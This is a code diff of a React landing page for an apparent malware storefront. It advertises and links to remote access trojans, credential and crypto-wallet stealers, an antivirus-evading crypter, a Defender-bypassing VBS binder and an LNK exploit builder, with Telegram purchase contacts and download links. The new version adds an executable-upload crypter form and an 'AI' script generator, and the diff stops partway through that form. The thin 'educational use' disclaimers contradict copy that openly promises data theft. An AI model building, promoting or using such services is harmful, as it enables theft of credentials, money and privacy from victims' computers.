@@ -1,475 +1,478 @@
-import { useState, useEffect } from "react";
+
+import { useState, useRef } from "react";
 import { Button } from "@/components/ui/button";
+import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
+import { Input } from "@/components/ui/input";
+import { Textarea } from "@/components/ui/textarea";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Badge } from "@/components/ui/badge";
-import { Activity, Users } from "lucide-react";
-import CookieBanner from "@/components/cookie-banner";
+import { Alert, AlertDescription } from "@/components/ui/alert";
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import { 
+  Brain, 
+  Code, 
+  Shield, 
+  Zap, 
+  Upload, 
+  Download, 
+  MessageSquare,
+  Triangle,
+  Send,
+  FileCode,
+  Minimize,
+  Lock,
+  Unlock,
+  Package,
+  Bot,
+  Eye,
+  Settings,
+  Terminal
+} from "lucide-react";
+import { useMutation } from "@tanstack/react-query";
 import AdminLoginModal from "@/components/admin-login-modal";
+import CookieBanner from "@/components/cookie-banner";
 
 export default function Landing() {
-  const [showAdminLogin, setShowAdminLogin] = useState(false);
-  const [visitorCount, setVisitorCount] = useState(1337);
+  const [showAdminModal, setShowAdminModal] = useState(false);
+  const [aiPrompt, setAiPrompt] = useState("");
+  const [aiResponse, setAiResponse] = useState("");
+  const [scriptInput, setScriptInput] = useState("");
+  const [scriptOutput, setScriptOutput] = useState("");
+  const [selectedTool, setSelectedTool] = useState("syntax-fixer");
+  const [crypterConfig, setCrypterConfig] = useState({
+    inputFile: null as File | null,
+    outputName: "protected_executable",
+    antiDebug: true,
+    antiVM: true,
+    polymorphic: true,
+    dotNetSupport: true,
+    compressionLevel: "high"
+  });
+  const fileInputRef = useRef<HTMLInputElement>(null);
 
-  useEffect(() => {
-    // Simulate visitor count updates
-    const interval = setInterval(() => {
-      setVisitorCount(prev => prev + Math.floor(Math.random() * 3));
-    }, 5000);
+  // Millennium AI Chat
+  const aiChat = useMutation({
+    mutationFn: async (prompt: string) => {
+      const response = await fetch('/api/millennium-ai', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ prompt })
+      });
+      if (!response.ok) throw new Error('AI request failed');
+      return response.json();
+    },
+    onSuccess: (data) => {
+      setAiResponse(data.response);
+    }
+  });
 
-    return () => clearInterval(interval);
-  }, []);
+  // Script Processing Tools
+  const scriptProcessor = useMutation({
+    mutationFn: async ({ script, tool }: { script: string; tool: string }) => {
+      const response = await fetch('/api/script-tools', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ script, tool })
+      });
+      if (!response.ok) throw new Error('Script processing failed');
+      return response.json();
+    },
+    onSuccess: (data) => {
+      setScriptOutput(data.processedScript);
+    }
+  });
+
+  // Advanced Crypter
+  const crypterProcessor = useMutation({
+    mutationFn: async (formData: FormData) => {
+      const response = await fetch('/api/advanced-crypter', {
+        method: 'POST',
+        body: formData
+      });
+      if (!response.ok) throw new Error('Crypter processing failed');
+      return response.json();
+    },
+    onSuccess: (data) => {
+      // Trigger download of crypted executable
+      const link = document.createElement('a');
+      link.href = data.downloadUrl;
+      link.download = data.filename;
+      link.click();
+    }
+  });
+
+  const handleFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
+    const file = event.target.files?.[0];
+    if (file) {
+      setCrypterConfig(prev => ({ ...prev, inputFile: file }));
+    }
+  };
+
+  const handleCrypterSubmit = () => {
+    if (!crypterConfig.inputFile) return;
+    
+    const formData = new FormData();
+    formData.append('file', crypterConfig.inputFile);
+    formData.append('config', JSON.stringify(crypterConfig));
+    
+    crypterProcessor.mutate(formData);
+  };
+
+  const scriptTools = [
+    { id: "syntax-fixer", label: "Syntax Fixer", icon: Code, description: "Automatically fix syntax errors in your scripts" },
+    { id: "minifier", label: "Script Minifier", icon: Minimize, description: "Compress and optimize your code" },
+    { id: "obfuscator", label: "Code Obfuscator", icon: Lock, description: "Protect your scripts from reverse engineering" },
+    { id: "deobfuscator", label: "Code Deobfuscator", icon: Unlock, description: "Deobfuscate and analyze protected code" }
+  ];
 
   return (
-    <div className="min-h-screen bg-black text-blue-300 overflow-x-hidden font-inter">
-      <style>{`
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap');
-
-        * {
-          margin: 0;
-          padding: 0;
-          box-sizing: border-box;
-          font-family: 'Inter', sans-serif;
-        }
-
-        body {
-          background: #0a0a0a;
-          color: #b3d4fc;
-          overflow-x: hidden;
-        }
-
-        .container {
-          max-width: 1400px;
-          margin: 0 auto;
-          padding: 30px 20px;
-          background: #121212;
-          border-radius: 10px;
-        }
-
-        header {
-          text-align: center;
-          padding: 50px 0;
-        }
-
-        header h1 {
-          font-size: 3em;
-          color: #4da8ff;
-          letter-spacing: 1px;
-          margin-bottom: 10px;
-        }
-
-        header p {
-          font-size: 1.3em;
-          color: #6b7280;
-        }
-
-        .intro {
-          padding: 30px;
-          text-align: center;
-          background: #1c2526;
-          border-radius: 10px;
-          margin: 20px 0;
-        }
-
-        .intro p {
-          font-size: 1.2em;
-          line-height: 1.6;
-          color: #b3d4fc;
-        }
-
-        .contact-btn, .download-btn, .buy-btn, .unified-btn {
-          display: inline-block;
-          margin: 15px 10px;
-          padding: 10px 25px;
-          background: #4da8ff;
-          color: #fff;
-          text-decoration: none;
-          font-size: 1.1em;
-          font-weight: 500;
-          border-radius: 6px;
-          transition: all 0.3s ease;
-          min-width: 120px; /* Unified width for buttons */
-          text-align: center; /* Ensure text is centered in buttons */
-        }
-
-        .contact-btn:hover, .download-btn:hover, .buy-btn:hover, .unified-btn:hover {
-          background: #2b6cb0;
-          transform: translateY(-1px);
-          box-shadow: 0 3px 10px rgba(77, 168, 255, 0.2);
-        }
-
-        .tool-section {
-          padding: 30px 0;
-          background: #1c2526;
-          border-radius: 10px;
-          margin: 20px 0;
-        }
-
-        .tool-section h2 {
-          font-size: 2em;
-          text-align: center;
-          margin-bottom: 15px;
-          color: #4da8ff;
-        }
-
-        .tool-section p {
-          font-size: 1.1em;
-          text-align: center;
-          color: #9ca3af;
-          margin-bottom: 15px;
-        }
-
-        .tool-gallery {
-          display: flex;
-          justify-content: center;
-          gap: 15px;
-          flex-wrap: wrap;
-          margin-bottom: 20px;
-        }
-
-        .tool-image {
-          position: relative;
-          max-width: 400px;
-          width: 100%;
-          border: 1px solid #2d3748;
-          border-radius: 8px;
-          transition: all 0.3s ease;
-        }
-
-        .tool-image:hover {
-          transform: translateY(-3px);
-          box-shadow: 0 4px 15px rgba(77, 168, 255, 0.1);
-        }
-
-        .tool-image img {
-          width: 100%;
-          border-radius: 8px;
-        }
-
-        .tool-image .caption {
-          position: absolute;
-          bottom: 8px;
-          left: 0;
-          right: 0;
-          text-align: center;
-          background: rgba(0, 0, 0, 0.6);
-          color: #b3d4fc;
-          padding: 6px;
-          font-size: 0.9em;
-          border-radius: 0 0 8px 8px;
-        }
-
-        .feature-list {
-          list-style: none;
-          padding: 0 20px;
-        }
-
-        .feature-list li {
-          font-size: 1em;
-          margin: 8px 0;
-          position: relative;
-          padding-left: 25px;
-          color: #b3d4fc;
-          transition: color 0.3s ease;
-        }
-
-        .feature-list li:hover {
-          color: #4da8ff;
-        }
-
-        .feature-list li:before {
-          content: "✔️";
-          position: absolute;
-          left: 0;
-          color: #4da8ff;
-          font-size: 1.1em;
-        }
-
-        .disclaimer {
-          position: fixed;
-          bottom: 0;
-          width: 100%;
-          background: #121212;
-          padding: 12px;
-          text-align: center;
-          border-top: 1px solid #ef4444;
-          font-size: 0.9em;
-          color: #ef4444;
-        }
-
-        @media (max-width: 768px) {
-          header h1 { font-size: 2em; }
-          header p { font-size: 1.1em; }
-          .intro p { font-size: 1em; }
-          .tool-section h2 { font-size: 1.8em; }
-          .tool-section p { font-size: 1em; }
-          .feature-list li { font-size: 0.9em; }
-          .tool-image { max-width: 90%; }
-          .container { padding: 20px 10px; }
-        }
-      `}</style>
-
-      <div className="container">
-        <header>
-        <h1>Millennium RAT Toolkit</h1>
-        <p>Professional Remote Access Tool with Advanced Educational Features</p>
+    <div className="min-h-screen bg-gradient-to-br from-black via-gray-900 to-blue-900 text-white">
+      {/* Header with Logo */}
+      <header className="relative py-8 px-6 text-center">
+        <div className="flex items-center justify-center mb-4">
+          <Triangle className="w-12 h-12 text-cyan-400 mr-4" style={{ filter: 'drop-shadow(0 0 10px #00bcd4)' }} />
+          <h1 className="text-6xl font-bold bg-gradient-to-r from-cyan-400 to-blue-400 bg-clip-text text-transparent">
+            MILLENNIUM
+          </h1>
+        </div>
+        <p className="text-xl text-gray-300 mb-8">Advanced Cybersecurity Framework</p>
+        
+        <Button 
+          onClick={() => setShowAdminModal(true)}
+          className="absolute top-4 right-4 bg-gray-800 hover:bg-gray-700"
+        >
+          <Settings className="w-4 h-4 mr-2" />
+          Admin
+        </Button>
       </header>
 
-      <section className="intro">
-        <p>Welcome to the Millennium RAT Toolkit - a comprehensive educational cybersecurity framework designed for authorized red team exercises and blue team training. Our advanced remote access tool features HTTP traffic sniffing, payload deployment, and educational monitoring capabilities. Perfect for cybersecurity education and authorized penetration testing.</p>
-        <p>Educational Use Only - Ensure Proper Authorization</p>
-      </section>
-
-        <section className="tool-section">
-          <h2>Millennium RAT v4.0</h2>
-          <p>A battle-tested Remote Access Tool with a 2-year legacy, now fully rewritten in C++ for unmatched performance. Control via Telegram with no server or port forwarding needed. Steal data, log keys, and own systems effortlessly.</p>
-          <div className="tool-gallery">
-            <div className="tool-image">
-              <img src="https://i.ibb.co/PZSZ98XD/8g4be4sa.png" alt="Millennium RAT Builder" />
-              <div className="caption">Millennium RAT - Control Panel</div>
-            </div>
+      <div className="container mx-auto px-6 space-y-12">
+        {/* Millennium AI Section */}
+        <section className="text-center mb-16">
+          <div className="flex items-center justify-center mb-6">
+            <Brain className="w-8 h-8 text-cyan-400 mr-3" />
+            <h2 className="text-4xl font-bold text-cyan-400">Millennium AI</h2>
           </div>
-          <a href="https://t.me/shinyenigma" target="_blank" className="buy-btn">Buy Now</a>
-          <ul className="feature-list">
-            <li>Fully rewritten in C++ for speed and stealth</li>
-            <li>Small native executable, zero dependencies</li>
-            <li>No Microsoft Visual C++ required</li>
-            <li>Works on Windows 7+ (32/64-bit)</li>
-            <li>Auto StartUp for persistent access</li>
-            <li>Anti double-launch protection</li>
-            <li>AutoStealer for effortless data theft</li>
-            <li>Keylogger for capturing every keystroke</li>
-            <li>Anti-VM and Anti-Debug for ultimate evasion</li>
-            <li>Compact, user-friendly builder</li>
-            <li>Self-installing or non-installing options</li>
-            <li>Auto command execution on first run</li>
-            <li>Adjustable startup/request delay</li>
-            <li>Remote PowerShell/CMD execution</li>
-            <li>System info grabbing (CPU, GPU, RAM, location, IP, MAC)</li>
-            <li>Discord token theft (client and browsers)</li>
-            <li>Telegram data extraction</li>
-            <li>Browser data theft (downloads, cookies, passwords, credit cards, history)</li>
-            <li>Crypto wallet recovery</li>
-            <li>Webcamera capture for surveillance</li>
-            <li>Privilege elevation for deeper control</li>
-            <li>Messageboxes, wallpaper changes, display rotation</li>
-            <li>One-command desktop file grabbing</li>
-            <li>File encryption/decryption</li>
-            <li>Window minimize/maximize control</li>
-            <li>Get active window title, battery info, software list</li>
-            <li>User logoff, PC hibernation, BSOD trigger</li>
-            <li>SendKeyPress for remote input</li>
-            <li>CMD command execution</li>
-            <li>Self-uninstall capability</li>
-            <li>File/Folder ops (copy, delete, download, upload, list)</li>
-            <li>System shutdown, restart, logoff</li>
-            <li>Process manager (run, list, kill, get path)</li>
-            <li>Bot gifting and much more</li>
-          </ul>
-        </section>
-
-        <section className="tool-section">
-          <h2>DotStealer</h2>
-          <p>A multifunctional Windows stealer that sends logs via Telegram bot—no dedicated server needed. Lifetime license for only $30 (updates included). Stay updated via my Telegram channel.</p>
-          <div className="tool-gallery">
-            <div className="tool-image">
-              <img src="https://i.ibb.co/mCnkNsTt/432992187-f48c474b-1e68-4f7d-ba6e-14ad01afdcf4.png" alt="DotStealer Builder" />
-              <div className="caption">DotStealer - Configuration Panel</div>
-            </div>
-          </div>
-          <a href="https://t.me/shinyenigma" target="_blank" className="buy-btn">Buy Now</a>
-          <ul className="feature-list">
-            <li>NEW: Significantly decreased file size</li>
-            <li>NEW: Grabs complete list of installed software</li>
-            <li>Easy-to-use compact builder</li>
-            <li>Client works on Windows 7+ (32/64-bit)</li>
-            <li>Anti double-launch protection</li>
-            <li>Anti-VM and Anti-Debug for evasion</li>
-            <li>Single .NET exe, no dependencies</li>
-            <li>Two types of data encryption</li>
-            <li>Grabs desktop files</li>
-            <li>Run from start directory or install</li>
-            <li>Browser data stealing (cookies, downloads, passwords, etc.)</li>
-            <li>App-Bound cookie protection bypass (no admin privileges)</li>
-            <li>Discord token grabbing</li>
-            <li>Telegram session grabbing</li>
-            <li>Desktop screenshot capture</li>
-            <li>Metamask and Exodus data stealing</li>
-            <li>System info stealing (IP, location, username, RAM, GPU, HWID, etc.)</li>
-          </ul>
-        </section>
-
-        <section className="tool-section">
-          <h2>Vedani-Crypter</h2>
-          <p>A renowned private Runtime & Scantime crypter with an updating stub and lifetime license—available for free. Protect your EXE files from antivirus scans with this powerful tool, complete with a video tutorial.</p>
-          <div className="tool-gallery">
-            <div className="tool-image">
-              <img src="https://i.ibb.co/BK3SgSQX/56c2nd8g.png" alt="Vedani-Crypter Interface" />
-              <div className="caption">Vedani-Crypter - Main Interface</div>
-            </div>
-          </div>
-          <a href="https://github.com/ardentus/Vedani-Crypter.git" target="_blank" className="download-btn">Download Vedani-Crypter</a>
-          <ul className="feature-list">
-            <li>Runtime & Scantime crypter for EXE protection</li>
-            <li>Updating stub for continuous effectiveness</li>
-            <li>Lifetime license, free to use</li>
-            <li>Includes a video tutorial for setup</li>
-          </ul>
-        </section>
-
-        <section className="tool-section">
-          <h2>VBS Binder</h2>
-          <p>A cutting-edge VBS binder generator that runs non-crypted builds without detection by Windows Defender. Adds Defender exclusions, downloads, and executes files while avoiding SmartScreen alerts.</p>
-          <div className="tool-gallery">
-            <div className="tool-image">
-              <img src="https://i.ibb.co/HDTpGjZ4/433060068-33a9d53e-05eb-46f0-8870-826cf9e0643d.png" alt="VBS Binder Interface" />
-              <div className="caption">VBS Binder - Generator Interface</div>
-            </div>
-          </div>
-          <a href="https://t.me/shinyenigma" target="_blank" className="buy-btn">Buy Now</a>
-          <ul className="feature-list">
-            <li>Random obfuscation for every generated file</li>
-            <li>No SmartScreen alerts for binder or downloaded files</li>
-            <li>No Windows Defender alerts</li>
-            <li>Bind multiple files with ease</li>
-            <li>Optional fake error for deception</li>
-          </ul>
-        </section>
-
-        <section className="tool-section">
-          <h2>LNK Exploit Builder</h2>
-          <p>An advanced exploit that generates a fake .txt file with a backdoor to execute EXE/BAT files silently. Designed for Windows 7 and higher, perfect for stealth operations.</p>
-          <div className="tool-gallery">
-            <div className="tool-image">
-              <img src="https://i.ibb.co/8LC2Rsr6/426710183-82256fed-fe27-481b-ac6a-d0fbf9701882.png" alt="LNK Exploit Builder Interface" />
-              <div className="caption">LNK Exploit Builder - Main Interface</div>
-            </div>
-          </div>
-          <a href="https://github.com/shinyelectron/LNK-Exploit.git" target="_blank" className="download-btn">Download LNK Exploit Builder</a>
-          <ul className="feature-list">
-            <li>NEW: Additional link encoding and obfuscation</li>
-            <li>Easy-to-use builder</li>
-            <li>Fake description generator</li>
-            <li>Hides backdoor code deep inside the binary</li>
-            <li>Txt downloading option for long text files</li>
-            <li>Silent PowerShell console in the background</li>
-            <li>Anti-analyzing: Property changes disable malicious code</li>
-            <li>Bypasses Windows SmartScreen alerts</li>
-            <li>Not blocked or deleted by Windows Defender</li>
-          </ul>
-        </section>
-
-        <section className="tool-section">
-          <h2>888 RAT (Windows/Android/Linux)</h2>
-          <p>An advanced hidden remote access tool, available for free, with modes for Android, Windows, and Linux. Dominate across platforms with this versatile RAT. Archive password: 888.</p>
-          <div className="tool-gallery">
-            <div className="tool-image">
-              <img src="https://i.ibb.co/9JMcNGy/426647492-039db33a-8d20-4607-8991-52c4dcbdd9fa.png" alt="888 RAT Interface" />
-              <div className="caption">888 RAT - Settings</div>
-            </div>
-          </div>
-          <a href="https://mega.nz/file/d6V1kB5C#snmOatmYcYDz4I7T4coGEElM7kyhU9prWE873FI8wz8" target="_blank" className="unified-btn">Download 888 RAT</a>
-          <ul className="feature-list">
-            <li>Anti-Analysis for stealth operation</li>
-            <li>Icon Changer for customization</li>
-            <li>Startup Sleep for delayed execution</li>
-            <li>Fake error for deception</li>
-            <li>VBS exploit integration</li>
-            <li>Supports Windows, Android, and Linux</li>
-            <li>File system access</li>
-            <li>Spy features: desktop, webcam, system sound</li>
-            <li>Stealer: passwords, cookies, FileZilla, etc.</li>
-            <li>CMD, regedit, get installed software</li>
-            <li>Network scanner, hidden RDP, DNS Spoof</li>
-            <li>PC info, GeoIP, Internet Speed Test, Open URL</li>
-            <li>Kill/Uninstall functionality</li>
-            <li>And much more</li>
-          </ul>
-        </section>
-
-        <footer style={{
-          marginTop: '50px',
-          padding: '40px 20px',
-          borderTop: '2px solid #2d3748',
-          backgroundColor: '#1a1a1a',
-          borderRadius: '10px'
-        }}>
-          <div style={{
-            display: 'flex',
-            justifyContent: 'space-between',
-            alignItems: 'center',
-            flexWrap: 'wrap',
-            gap: '20px'
-          }}>
-            <div style={{ flex: 1 }}>
-              <h3 style={{ color: '#4da8ff', marginBottom: '15px' }}>Elite Hacking Tools</h3>
-              <p style={{ color: '#9ca3af', fontSize: '0.9em', lineHeight: '1.5' }}>
-                Professional cybersecurity tools for advanced users. All software is provided as-is for educational and authorized testing purposes only.
-              </p>
-              <div style={{ marginTop: '15px' }}>
-                <a href="#" style={{ color: '#4da8ff', textDecoration: 'none', margin: '0 15px 0 0' }}>Terms of Service</a>
-                <a href="#" style={{ color: '#4da8ff', textDecoration: 'none', margin: '0 15px 0 0' }}>Privacy Policy</a>
-                <a href="#" style={{ color: '#4da8ff', textDecoration: 'none', margin: '0 15px 0 0' }}>License</a>
-                <a href="#" style={{ color: '#4da8ff', textDecoration: 'none' }}>Contact</a>
+          <p className="text-lg text-gray-300 mb-8">AI-powered cybersecurity assistant for script generation and security analysis</p>
+          
+          <Card className="max-w-4xl mx-auto bg-gray-900/50 border-cyan-500/30 backdrop-blur">
+            <CardContent className="p-6">
+              <div className="space-y-4">
+                <Textarea
+                  placeholder="Ask Millennium AI to write scripts, analyze code, or answer cybersecurity questions..."
+                  value={aiPrompt}
+                  onChange={(e) => setAiPrompt(e.target.value)}
+                  className="bg-gray-800 border-gray-600 text-white min-h-[100px]"
+                />
+                <Button 
+                  onClick={() => aiChat.mutate(aiPrompt)}
+                  disabled={aiChat.isPending || !aiPrompt.trim()}
+                  className="w-full bg-cyan-600 hover:bg-cyan-700"
+                >
+                  <MessageSquare className="w-4 h-4 mr-2" />
+                  {aiChat.isPending ? 'Processing...' : 'Ask Millennium AI'}
+                </Button>
+                
+                {aiResponse && (
+                  <div className="mt-4 p-4 bg-gray-800 rounded border border-cyan-500/30">
+                    <pre className="whitespace-pre-wrap text-sm text-gray-200">{aiResponse}</pre>
+                  </div>
+                )}
               </div>
-            </div>
-            <div style={{
-              display: 'flex',
-              flexDirection: 'column',
-              alignItems: 'center',
-              gap: '10px'
-            }}>
-              <button
-                onClick={() => setShowAdminLogin(true)}
-                style={{
-                  background: 'linear-gradient(45deg, #1a1a1a, #2d3748)',
-                  border: '2px solid #4da8ff',
-                  borderRadius: '50%',
-                  width: '80px',
-                  height: '80px',
-                  display: 'flex',
-                  alignItems: 'center',
-                  justifyContent: 'center',
-                  cursor: 'pointer',
-                  transition: 'all 0.3s ease',
-                  fontSize: '2em'
-                }}
-                onMouseOver={(e) => {
-                  e.currentTarget.style.transform = 'scale(1.1)';
-                  e.currentTarget.style.boxShadow = '0 5px 20px rgba(77, 168, 255, 0.3)';
-                }}
-                onMouseOut={(e) => {
-                  e.currentTarget.style.transform = 'scale(1)';
-                  e.currentTarget.style.boxShadow = 'none';
-                }}
-              >
-                🛡️
-              </button>
-              <span style={{ color: '#9ca3af', fontSize: '0.8em', textAlign: 'center' }}>
-                Secure Access Portal
-              </span>
-            </div>
+            </CardContent>
+          </Card>
+        </section>
+
+        {/* Products Section */}
+        <section className="grid md:grid-cols-2 gap-8 mb-16">
+          {/* Millennium RAT */}
+          <Card className="bg-gray-900/50 border-cyan-500/30 backdrop-blur overflow-hidden">
+            <CardHeader className="text-center">
+              <img 
+                src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCADgAOADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAP..." 
+                alt="Millennium RAT" 
+                className="w-full h-48 object-cover rounded-lg mb-4"
+              />
+              <CardTitle className="text-2xl text-cyan-400">Millennium RAT</CardTitle>
+              <p className="text-gray-300">Advanced Remote Access Tool with Telegram C2</p>
+            </CardHeader>
+            <CardContent>
+              <ul className="space-y-2 text-sm text-gray-300 mb-4">
+                <li>• Telegram-based command & control</li>
+                <li>• Advanced persistence mechanisms</li>
+                <li>• Real-time screen capture</li>
+                <li>• Keylogger & data exfiltration</li>
+                <li>• Anti-detection techniques</li>
+              </ul>
+              <div className="flex space-x-2">
+                <Button className="flex-1 bg-blue-600 hover:bg-blue-700">
+                  <Download className="w-4 h-4 mr-2" />
+                  Download
+                </Button>
+                <Button variant="outline" className="border-cyan-500 text-cyan-400">
+                  <Send className="w-4 h-4 mr-2" />
+                  Telegram
+                </Button>
+              </div>
+            </CardContent>
+          </Card>
+
+          {/* Dot Stealer */}
+          <Card className="bg-gray-900/50 border-cyan-500/30 backdrop-blur overflow-hidden">
+            <CardHeader className="text-center">
+              <img 
+                src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCADgAOADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAP..." 
+                alt="Dot Stealer" 
+                className="w-full h-48 object-cover rounded-lg mb-4"
+              />
+              <CardTitle className="text-2xl text-cyan-400">Dot Stealer</CardTitle>
+              <p className="text-gray-300">Advanced Data Extraction Framework</p>
+            </CardHeader>
+            <CardContent>
+              <ul className="space-y-2 text-sm text-gray-300 mb-4">
+                <li>• Browser credentials & cookies</li>
+                <li>• Discord & Telegram sessions</li>
+                <li>• Cryptocurrency wallets</li>
+                <li>• System information gathering</li>
+                <li>• Anti-VM & debugging protection</li>
+              </ul>
+              <div className="flex space-x-2">
+                <Button className="flex-1 bg-blue-600 hover:bg-blue-700">
+                  <Download className="w-4 h-4 mr-2" />
+                  Download
+                </Button>
+                <Button variant="outline" className="border-cyan-500 text-cyan-400">
+                  <Send className="w-4 h-4 mr-2" />
+                  Telegram
+                </Button>
+              </div>
+            </CardContent>
+          </Card>
+        </section>
+
+        {/* Script Tools Section */}
+        <section className="mb-16">
+          <div className="text-center mb-8">
+            <h2 className="text-3xl font-bold text-cyan-400 mb-4">Script Processing Tools</h2>
+            <p className="text-gray-300">Advanced tools for script analysis, optimization, and protection</p>
           </div>
-          <div style={{
-            marginTop: '30px',
-            paddingTop: '20px',
-            borderTop: '1px solid #2d3748',
-            textAlign: 'center',
-            color: '#6b7280',
-            fontSize: '0.8em'
-          }}>
-            <p>© 2024 Elite Hacking Tools. All rights reserved. | Professional cybersecurity solutions.</p>
+
+          <Card className="bg-gray-900/50 border-cyan-500/30 backdrop-blur">
+            <CardContent className="p-6">
+              <Tabs value={selectedTool} onValueChange={setSelectedTool}>
+                <TabsList className="grid w-full grid-cols-4 bg-gray-800">
+                  {scriptTools.map(tool => (
+                    <TabsTrigger key={tool.id} value={tool.id} className="data-[state=active]:bg-cyan-600">
+                      <tool.icon className="w-4 h-4 mr-2" />
+                      {tool.label}
+                    </TabsTrigger>
+                  ))}
+                </TabsList>
+
+                {scriptTools.map(tool => (
+                  <TabsContent key={tool.id} value={tool.id} className="mt-6">
+                    <div className="space-y-4">
+                      <p className="text-gray-300">{tool.description}</p>
+                      
+                      <div className="grid md:grid-cols-2 gap-4">
+                        <div>
+                          <label className="block text-sm font-medium text-gray-300 mb-2">Input Script</label>
+                          <Textarea
+                            placeholder="Paste your script here or upload a file..."
+                            value={scriptInput}
+                            onChange={(e) => setScriptInput(e.target.value)}
+                            className="bg-gray-800 border-gray-600 text-white h-64 font-mono text-sm"
+                          />
+                        </div>
+                        
+                        <div>
+                          <label className="block text-sm font-medium text-gray-300 mb-2">Processed Output</label>
+                          <Textarea
+                            value={scriptOutput}
+                            readOnly
+                            className="bg-gray-800 border-gray-600 text-white h-64 font-mono text-sm"
+                            placeholder="Processed script will appear here..."
+                          />
+                        </div>
+                      </div>
+
+                      <div className="flex space-x-4">
+                        <Button
+                          onClick={() => scriptProcessor.mutate({ script: scriptInput, tool: selectedTool })}
+                          disabled={scriptProcessor.isPending || !scriptInput.trim()}
+                          className="bg-cyan-600 hover:bg-cyan-700"
+                        >
+                          <tool.icon className="w-4 h-4 mr-2" />
+                          {scriptProcessor.isPending ? 'Processing...' : `Apply ${tool.label}`}
+                        </Button>
+                        
+                        <Button variant="outline" className="border-gray-600">
+                          <Upload className="w-4 h-4 mr-2" />
+                          Upload File
+                        </Button>
+                        
+                        {scriptOutput && (
+                          <Button variant="outline" className="border-gray-600">
+                            <Download className="w-4 h-4 mr-2" />
+                            Download
+                          </Button>
+                        )}
+                      </div>
+                    </div>
+                  </TabsContent>
+                ))}
+              </Tabs>
+            </CardContent>
+          </Card>
+        </section>
+
+        {/* Advanced Polymorphic Crypter */}
+        <section className="mb-16">
+          <div className="text-center mb-8">
+            <h2 className="text-3xl font-bold text-cyan-400 mb-4">Advanced Polymorphic Crypter</h2>
+            <p className="text-gray-300">Military-grade executable protection for .NET and native binaries</p>
           </div>
+
+          <Card className="bg-gray-900/50 border-cyan-500/30 backdrop-blur">
+            <CardContent className="p-6">
+              <div className="grid md:grid-cols-2 gap-6">
+                <div className="space-y-4">
+                  <div>
+                    <label className="block text-sm font-medium text-gray-300 mb-2">Upload Executable</label>
+                    <input
+                      type="file"
+                      ref={fileInputRef}
+                      onChange={handleFileUpload}
+                      accept=".exe,.dll,.net"
+                      className="hidden"
+                    />
+                    <Button
+                      onClick={() => fileInputRef.current?.click()}
+                      variant="outline"
+                      className="w-full border-gray-600 text-gray-300"
+                    >
+                      <Upload className="w-4 h-4 mr-2" />
+                      {crypterConfig.inputFile ? crypterConfig.inputFile.name : 'Select File'}
+                    </Button>
+                  </div>
+
+                  <div>
+                    <label className="block text-sm font-medium text-gray-300 mb-2">Output Name</label>
+                    <Input
+                      value={crypterConfig.outputName}
+                      onChange={(e) => setCrypterConfig(prev => ({ ...prev, outputName: e.target.value }))}
+                      className="bg-gray-800 border-gray-600 text-white"
+                      placeholder="protected_executable"
+                    />
+                  </div>
+
+                  <div>
+                    <label className="block text-sm font-medium text-gray-300 mb-2">Compression Level</label>
